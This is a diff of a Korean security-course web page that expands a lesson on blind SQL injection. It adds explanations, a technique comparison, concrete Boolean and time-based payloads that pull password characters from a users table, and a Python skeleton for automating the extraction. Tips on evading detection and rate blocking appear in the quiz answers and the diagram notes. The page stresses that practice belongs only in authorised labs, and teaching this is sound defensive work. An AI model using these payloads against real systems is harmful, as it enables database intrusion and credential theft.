@@ -16,9 +16,33 @@
 <div class="alert alert-danger py-2"><small>⚠️ 실습은 본인 소유 VM·실습용 사이트(허가된 환경)에서만 수행하세요.</small></div>
 <h4 class="mt-4">1. 학습 목표</h4><ul><li>Boolean-based: 참/거짓 응답 차이 이용</li><li>Time-based: SLEEP() 지연으로 추측</li><li>SUBSTRING()으로 한 글자씩 추출 + 자동화 개념</li></ul>
 <h4 class="mt-4">2. 핵심 개념</h4><ul><li>Boolean-based: 참/거짓 응답 차이 이용</li><li>Time-based: SLEEP() 지연으로 추측</li><li>SUBSTRING()으로 한 글자씩 추출 + 자동화 개념</li></ul>
-<h4 class="mt-4">3. 예제</h4><pre class="bg-light p-3 border rounded">' AND SUBSTRING(password,1,1)='a' --</pre>
-<h4 class="mt-4">4. 실습</h4><p>참/거짓 입력에 대한 응답 차이를 표로 기록해본다.</p>
-<h4 class="mt-4">5. 퀴즈</h4><ol><li>Time-based 추출 원리는?</li><li>자동화 도구를 쓰기 전 수동으로 해야 할 것은?</li></ol>
+<h4 class="mt-4">2-2. 동작 원리 심화: 대답 없는 상대에게 묻는 법</h4><p>에러도 데이터도 안 보여주면, <strong>예·아니오로 답할 수밖에 없는 질문</strong>을 던집니다. 참이면 정상 페이지, 거짓이면 빈 페이지(Boolean). 그것마저 막히면 <strong>응답 시간 차이</strong>로 답을 읽습니다(Time).</p><div class="mermaid">flowchart TD
+  Q["에러·데이터 숨김 확인"] --> B["Boolean 시도<br/>AND 1=1 vs 1=2"]
+  B --> D{"응답 차이?"}
+  D -->|예| E["SUBSTRING 한 글자씩<br/>이진탐색 추출"]
+  D -->|아니오| T["Time 시도<br/>IF+SLEEP"]
+  T --> M["지연 측정<br/>참=5초·거짓=즉시"]
+  E --> A["자동화 스크립트"]
+  M --> A</div><p class="text-muted small">읽는 법: Boolean이 되면 가장 빠르고, 안 되면 Time으로 갑니다. 한 글자씩 묻는 구조라 자동화가 필수입니다.</p><h4 class="mt-4">2-3. 추출 기법 비교</h4><table class="table table-sm table-bordered"><tr><th>기법</th><th>신호</th><th>속도</th><th>필요 조건</th></tr><tr><td>Boolean</td><td>참·거짓 화면 차이</td><td>빠름</td><td>구분 가능한 응답</td></tr><tr><td>Time</td><td>지연 시간</td><td>느림</td><td>SLEEP 계열 함수 허용</td></tr><tr><td>Out-of-band</td><td>외부 DNS·HTTP 요청</td><td>중간</td><td>서버의 외부 통신 허용</td></tr></table><h4 class="mt-4">3. 예제</h4><pre class="bg-light p-3 border rounded">' AND SUBSTRING(password,1,1)='a' --</pre><h4 class="mt-4">3-2. 심화 예제: 수동→자동(실습 앱)</h4><pre class="bg-light p-3 border rounded"># 1) Boolean 판정 (id=7 기준)
+id=7' AND 1=1 --     → 정상 (참)
+id=7' AND 1=2 --     → 비정상 (거짓)
+# 2) 첫 글자 추측 (a~z 순회)
+id=7' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
+# 3) Time 판정 (Boolean이 안 될 때)
+id=7' AND IF(1=1,SLEEP(5),0) --     → 5초 지연
+id=7' AND IF(1=2,SLEEP(5),0) --     → 즉시
+# 4) 자동화cerpt (참거짓 함수만 교체하면 Time용)
+import requests
+def ask(payload):
+    r = requests.get(URL, params={"id": payload}, timeout=10)
+    return "정상문구" in r.text  # Boolean 판정자</pre><h4 class="mt-4">4. 실습</h4><ol><li>참/거짓 입력에 대한 응답 차이를 표로 기록해본다.</li><li>SUBSTRING으로 첫 글자 3개를 수동 추출한다.</li><li>이진탐색(중간값 비교)으로 질문 횟수를 줄여본다.</li><li>Time 페이로드로 지연 차이를 스톱워치로 측정한다.</li><li>위 스크립트 골격에 한 글자 추출 루프를 완성한다.</li></ol><h4 class="mt-4">5. 퀴즈</h4><ol><li>Time-based 추출 원리는?</li><li>자동화 도구를 쓰기 전 수동으로 해야 할 것은?</li><li>Boolean과 Time 중 먼저 시도하는 쪽은? 이유는?</li><li>이진탐색을 쓰는 이유는?</li><li>sqlmap 사용 시 반드시 확인할 전제조건은?</li></ol><details class="mb-2"><summary>정답 보기</summary><ol><li>조건 참일 때만 SLEEP으로 지연시켜 시간 차이로 참거짓을 읽는 것이다.</li><li>인젝션 판정과 응답 구분자(정상문구) 확보다. 자동화는 판정자를 먹고 산다.</li><li>Boolean이다. 빠르고 네트워크 잡음에 강하기 때문이다.</li><li>한 글자당 질문을 26회에서 5회로 줄여 탐지를 피하고 속도를 올리기 위해서이다.</li><li>허가된 실습 범위·대상 확인이다. 무단 사용은 불법이다.</li></ol></details><h4 class="mt-4">5-2. 한눈에 보는 추출 루프</h4><div class="mermaid">sequenceDiagram
+  participant S as 스크립트
+  participant W as 웹 서버
+  S->>W: SUBSTRING(pos,1)=X?
+  W-->>S: 참·거짓 신호
+  S->>S: 다음 후보·위치
+  S->>W: 반복
+  W-->>S: 한 글자 확정</div><p class="text-muted small">읽는 법: 위치와 후보 문자를 바꿔가며 묻는 루프입니다. 요청 간격을 두지 않으면 차단되므로 지연을 넣습니다.</p><h4 class="mt-4">6. 흔한 실수</h4><ul><li>네트워크 지터를 참거짓으로 오판하는 경우. Time은 임계값+반복 확인이 필수이다.</li><li>대소문자·공백을 무시하고 추출해 복원에 실패하는 경우</li></ul>
 <div class="d-flex justify-content-between mt-5"><a class="btn btn-secondary" href="web-l06-01.html">← SQL Injection 기초</a><a class="btn btn-primary" href="web-l08-01.html">JWT 취약점 →</a></div></main>
 </div></div>
 <footer class="bg-dark text-white text-center py-3"><small>보안 수업자료 · 교육용 (실습은 허가된 환경에서만)</small></footer>
